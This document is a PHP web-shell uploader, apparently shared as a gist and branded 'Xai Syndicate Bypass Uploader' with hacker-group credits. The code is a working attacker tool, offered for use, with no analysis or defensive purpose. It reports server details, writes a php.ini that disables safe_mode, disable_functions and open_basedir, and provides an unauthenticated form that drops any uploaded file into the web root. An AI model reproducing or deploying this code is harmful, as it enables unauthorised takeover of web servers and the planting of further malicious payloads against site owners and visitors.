Kaizen1337 / PHP
Xai Uploader
PHP
<html>
<head>
<title>Xai Syndicate Uploader !</title>
<meta name="keywords" content="Kaizen Uploader,Xai syndicate uploader,xai syndicate,xai,kaizen">
<meta name="description" content="Xai Syndicate Uploader">
<meta name="rating" content="General">
<meta name="revisit-after" content="1 days">
<meta name="classification" content="Author by Kaizen">
<meta name="robots schedule" content="auto">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	height: 24px;
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: white; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
</style>
</head>
<center><br>
<pre>
▂▃▅▇█▓▒░۩۞۩ஜ۩ XAI SYNDICATE ۩ஜ۩۞۩░▒▓█▇▅▃▂

☠️   Allah always watching you :)   ☠️  

▬▬▬▬▬▬▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬▬▬▬▬▬▬

</pre>
<a href="https://www.facebook.com/Kaizen1337.gov"><img src='https://preview.ibb.co/hRrqTS/uploader.png' title="Official Xai Syndicate" width='700' height='180' align='center'></a>
<br>
<body bgcolor="black">
<?php
/*
[]##############################################
[]----------------------------------------------------------------                     
[] Xai Syndicate Bypass Uploader
[] Author : Kaizen - Con7ext - Mr.7z
[] Thanks to : AnonGhost Team - Lulzsec India - Xai Syndicate - Green Coders
[] Contact : https://www.facebook.com/Kaizen1337.gov                                                        
[] ---------------------------------------------------------------
[]##############################################
*/ 
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); 
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=red>NONE</font>";
echo "<b><font color='white'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<b><font color='white'><br>".php_uname()."</b></font><br>";
echo "<b><font color='white'>Disable Functions : $show_ds</b></font><br><br>";
echo "<form method='post'>
<input type='submit' name='funct' value='Bypass Disabled Functions'>
</form>";
if($_POST['funct']) {
$file = 'php.ini';
file_put_contents($file,'safe_mode = OFF
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF');
echo "<font color='#2EFEF7'>Bypased!!</font>";
}

echo "<font color='white'><form method='post' enctype='multipart/form-data'>
	  <input type='file' name='file'>
	  <input type='submit' name='upload' value='Fvck`em'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Upload Success , File Location at=> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Upload Failed";
		}
	} else {
		if(@copy($_FILES['file']['tmp_name'], $files)) {
			echo "Success <b>$files</b> at folder";
		} else {
			echo "Upload Failed";
		}
	}
}

?>
<script>alert('Notes : Gunakan tools ini dengan bijak , recode jangan lupa mengembangkan tools dan harap sertakan copyright ya kimak bukan cuma edite background + hapus copyright ,for reason; jangan lupa sholat 5 waktu , Allah always watching you :) ingat dosa ingat siksa kubur :) Jangan Hek-hekan mulu goblok | KAIZEN STILL GANS ;)')</script>
<font face='Arial' color='white' size='4px'><br>━═★ Powered by Xai Syndicate 2018 ★═━
</html>
Comment on gist

Leave a comment
Comment
 Desktop version